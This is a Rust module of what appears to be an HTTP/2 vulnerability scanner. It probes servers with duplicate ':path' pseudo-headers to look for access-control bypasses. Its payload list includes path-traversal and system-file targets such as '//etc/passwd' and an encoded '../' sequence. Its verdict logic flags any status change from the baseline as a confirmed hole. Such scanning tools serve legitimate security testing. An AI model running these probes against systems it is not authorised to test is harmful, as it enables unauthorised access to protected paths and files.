use crate::net::{h2, NetConfig};
use crate::output::ScanResult;
use crate::auth::AuthStore;

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    if !*silent {
        crate::print_dbg("H2 dual :path injection probe");
    }

    let mut conn = h2::h2_connect(&cfg.host, cfg.port, cfg.tls, cfg.timeout.as_secs()).await?;

    let (baseline_status, _, _baseline_body) = h2::send_h2_request(
        &mut conn.send_request,
        "GET",
        "/",
        &cfg.host,
        &auth_headers(auth),
        b"",
    ).await?;

    let mut conn2 = h2::h2_connect(&cfg.host, cfg.port, cfg.tls, cfg.timeout.as_secs()).await?;

    let dual_paths = vec![
        ("/admin", "/"),
        ("/api/users", "/api"),
        ("//etc/passwd", "/"),
        ("/..%2f..%2f..%2fwin", "/"),
    ];

    let mut vulnerable = false;
    let mut response_status: u16 = 0;
    let mut success_path: Option<String> = None;

    for (path_a, path_b) in &dual_paths {
        let pseudo = vec![
            (":method", "GET"),
            (":path", path_a),
            (":path", path_b),
            (":scheme", if cfg.tls { "https" } else { "http" }),
            (":authority", &cfg.host),
        ];

        let auth_vec = auth_headers(auth);
        let extra: Vec<(&[u8], &[u8])> = auth_vec
            .iter()
            .map(|(k, v)| (k.as_bytes(), v.as_bytes()))
            .collect();

        match h2::send_h2_request_raw_headers(
            &mut conn2.send_request,
            &pseudo,
            &extra,
            b"",
            &cfg.host,
        ).await {
            Ok((status, _headers, _body)) => {
                response_status = status;
                if status > 0 && status != baseline_status {
                    vulnerable = true;
                    success_path = Some(format!("{} / {}", path_a, path_b));
                    if !*silent {
                        crate::print_det(&format!(
                            "H2 dual :path confirmed: '{}' and '{}' concatenated (resp {})",
                            path_a, path_b, status
                        ));
                    }
                    break;
                }
            }
            Err(_) => continue,
        }
    }

    let host_name = &cfg.host;
    Ok(ScanResult {
        
        host: host_name.to_string(),
        port: cfg.port,
        variant: "h2-dual-path".to_string(),
        vulnerable,
        server: None,
        bypass: success_path,
        status_code: response_status,
        details: if vulnerable {
            Some("H2 dual :path: server concatenated or processed multiple :path pseudo-headers".into())} else {
            None
        },
            ..Default::default()
        
    })
}

fn auth_headers(auth: Option<&AuthStore>) -> Vec<(String, String)> {
    match auth {
        Some(a) => a.to_headers_vec(),
        None => Vec::new(),
    }
}
